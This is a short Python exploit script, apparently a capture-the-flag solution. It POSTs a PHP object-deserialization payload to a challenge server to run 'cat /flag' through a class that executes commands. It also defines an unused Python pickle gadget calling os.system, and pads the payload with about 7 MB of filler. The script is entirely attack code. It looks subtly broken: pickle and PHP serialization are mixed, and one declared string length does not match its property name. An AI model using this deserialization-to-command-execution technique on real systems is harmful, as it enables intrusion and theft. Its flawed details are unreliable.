import requests

url = "http://challenge.bluesharkinfo.com:28995/index.php"

# 假设有 Shark 类，private 属性 cmd，__wakeup 执行 system
import pickle
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ("cat /flag*",))

# 或者直接字符串
payload = "blueshark:O:5:\"Shark\":1:{s:11:\"\0Shark\0cmd\";s:9:\"cat /flag\";}" + "A"*7340032

requests.post(url, data={"shark": payload})